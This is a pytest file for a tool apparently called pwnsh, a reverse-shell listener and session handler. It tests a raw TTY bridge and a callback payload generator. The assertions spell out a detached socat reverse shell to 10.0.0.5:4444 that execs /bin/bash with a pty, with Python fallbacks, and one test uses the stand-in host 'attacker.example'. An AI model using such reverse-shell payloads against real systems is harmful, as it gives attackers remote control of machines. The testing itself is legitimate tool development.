"""Tests for raw-interact mode and /pty --reconnect callback payloads."""
from __future__ import annotations

import asyncio
import contextlib
import os

from pwnsh.fingerprint import callback_pty_payload
from pwnsh.listener import TCPListener
from pwnsh.raw_interact import DEFAULT_ESCAPE, run_raw_bridge
from pwnsh.session import SessionRegistry


def test_callback_pty_payload_contains_three_fallbacks():
    p = callback_pty_payload("10.0.0.5", 4444)
    assert "socat tcp:10.0.0.5:4444" in p
    assert "exec:/bin/bash,pty,stderr,setsid,sigint,sane" in p
    assert "python3 -c" in p
    assert "python -c" in p
    assert "@@PW_RECONNECT_FAIL@@" in p
    # detached so the spawned shell survives the parent exiting
    assert "&)" in p
    # uses the right host:port
    assert "10.0.0.5" in p and "4444" in p


def test_callback_pty_payload_quotes_host_safely():
    p = callback_pty_payload("attacker.example", 9090)
    # Single-quoted inside Python's outer double quotes — no shell injection
    # surface even if host had weird chars (we still trust the caller).
    assert "('attacker.example',9090)" in p


def test_raw_bridge_aborts_when_stdin_is_not_tty(free_port):
    """run_raw_bridge should refuse cleanly when stdin isn't a tty."""

    async def go():
        reg = SessionRegistry()
        listener = TCPListener(reg, host="127.0.0.1", port=free_port)
        await listener.start()
        try:
            r, w = await asyncio.open_connection("127.0.0.1", free_port)
            await asyncio.sleep(0.1)
            s = reg.all()[0]
            # Force fd 0 to be /dev/null so isatty(0) is False regardless of
            # how pytest was invoked (with -s or via a real tty).
            saved = os.dup(0)
            devnull = os.open(os.devnull, os.O_RDONLY)
            os.dup2(devnull, 0)
            os.close(devnull)
            try:
                msg = await run_raw_bridge(s)
            finally:
                os.dup2(saved, 0)
                os.close(saved)
            w.close()
            with contextlib.suppress(Exception):
                await w.wait_closed()
            return msg
        finally:
            await listener.stop()

    msg = asyncio.run(go())
    assert "not a tty" in msg


def test_raw_bridge_refuses_archived_session():
    """Archived sessions have writer=None — raw mode would have nothing to
    write to, so it must bail out without touching termios."""
    from pwnsh.session import Session

    async def go():
        s = Session(
            id=1, reader=None, writer=None,
            remote=("1.1.1.1", 2), status="archived",
        )
        return await run_raw_bridge(s)

    msg = asyncio.run(go())
    assert "archived" in msg


def test_raw_bridge_escape_byte_is_ctrl_g():
    """Ctrl+G is reachable on every keyboard layout (incl. Swedish, German…) —
    Ctrl+] is not, because `]` is AltGr-something on most non-US layouts."""
    assert DEFAULT_ESCAPE == b"\x07"


def test_raw_bridge_round_trip_with_pty(free_port):
    """End-to-end: open a real local PTY, attach stdin/stdout to its slave,
    fork a writer that types `whoami\\n` then the escape byte, and assert
    that those bytes show up in the session.bytes_tx + that the bridge
    returns a clean status string."""
    if not hasattr(os, "openpty"):
        return  # platform without pty support

    master_fd, slave_fd = os.openpty()

    pid = os.fork()
    if pid == 0:
        # Child: become a "user" typing into the master end after a delay.
        try:
            os.close(slave_fd)
            import time
            time.sleep(0.3)
            os.write(master_fd, b"whoami\n")
            time.sleep(0.2)
            os.write(master_fd, b"\x07")  # escape — Ctrl+G
            time.sleep(0.2)
        finally:
            os._exit(0)

    os.close(master_fd)

    # Parent: redirect our stdin to the slave so run_raw_bridge picks it up.
    saved_stdin = os.dup(0)
    os.dup2(slave_fd, 0)
    try:
        async def go():
            reg = SessionRegistry()
            listener = TCPListener(reg, host="127.0.0.1", port=free_port)
            await listener.start()
            try:
                r, w = await asyncio.open_connection("127.0.0.1", free_port)
                await asyncio.sleep(0.1)
                s = reg.all()[0]
                msg = await run_raw_bridge(s, banner=False)
                w.close()
                with contextlib.suppress(Exception):
                    await w.wait_closed()
                return msg, s.bytes_tx
            finally:
                await listener.stop()

        msg, tx = asyncio.run(go())
    finally:
        os.dup2(saved_stdin, 0)
        os.close(saved_stdin)
        os.close(slave_fd)
        try:
            os.waitpid(pid, 0)
        except ChildProcessError:
            pass

    # The "whoami\n" before the escape should have made it through.
    # (`whoami\n` = 7 bytes; escape is consumed and not transmitted.)
    assert tx >= 7, f"expected >=7 bytes tx, got {tx}"
    assert "left raw mode" in msg or "stdin closed" in msg
